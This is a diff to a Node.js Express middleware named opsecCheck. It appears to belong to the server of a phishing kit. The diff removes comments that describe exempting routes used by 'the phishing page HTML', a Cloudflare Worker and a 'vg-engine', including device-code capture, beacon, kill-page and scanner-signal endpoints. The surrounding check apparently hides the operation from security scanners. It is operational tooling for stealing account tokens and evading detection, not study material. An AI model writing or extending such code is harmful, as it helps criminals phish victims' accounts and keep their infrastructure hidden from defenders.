@@ -386,27 +386,16 @@ async function opsecCheck(req, res, next) {
     // Load OPSEC settings from cache or DB
     const settings = await getOpsecSettings();
 
-    // Always allow admin/user panel pages and their API routes.
-    // Auth middleware on the routes still enforces authentication.
     const adminPrefix = '/' + config.ADMIN_PATH;
     const isAdminApi = req.path.startsWith('/api/admin') || req.path === '/api/auth/admin-login' || req.path === '/api/auth/admin-setup';
-    // Also exempt all user auth routes — they have rate limiting and JWT, no OPSEC needed.
-    // Admin login/setup are already covered by isAdminApi above.
     const isUserAuthApi = req.path.startsWith('/api/auth/');
-    // Also exempt device-code flow routes: /api/verify, /api/capture (including /api/capture/visitor/*).
-    // These are called by the Cloudflare Worker (empty UA, datacenter IP) and by the phishing page HTML.
-    // They authenticate via JWT token in the request body, so OPSEC is not needed here.
-    // Also exempt every other /api/* route the worker, vg-engine (phishing HTML), and
-    // admin/user panels call — they all have their own JWT / session / admin-auth checks.
     const isDeviceFlowApi = req.path.startsWith('/api/verify') || req.path.startsWith('/api/capture');
-    const isWorkerLog = req.path.startsWith('/api/log'); // Cloudflare Worker + vg-engine
-    const isPhishingBeacon = req.path.startsWith('/api/beacon'); // vg-engine + phishing HTML
-    const isPhishingKill = req.path.startsWith('/api/killpage'); // vg-engine
-    const isScannerSignal = req.path.startsWith('/api/scanner-signal'); // CF Worker reports blocked IPs
-    const isDeviceCode = req.path.startsWith('/api/device'); // vg-engine (device-code flow)
-    const isDebugDeviceCode = req.path === '/api/debug/devicecode'; // JWT-gated diagnostic dump
-    // Browser-automatic favicon request. No payload, no auth — the browser fires it on
-    // every page load so blocking it would just hide the icon, never break a function.
+    const isWorkerLog = req.path.startsWith('/api/log'); 
+    const isPhishingBeacon = req.path.startsWith('/api/beacon'); 
+    const isPhishingKill = req.path.startsWith('/api/killpage'); 
+    const isScannerSignal = req.path.startsWith('/api/scanner-signal');
+    const isDeviceCode = req.path.startsWith('/api/device'); 
+    const isDebugDeviceCode = req.path === '/api/debug/devicecode'; 
     const isStaticAsset = req.path === '/favicon.ico';
     const isPanelApi =
       req.path.startsWith('/api/preview') ||
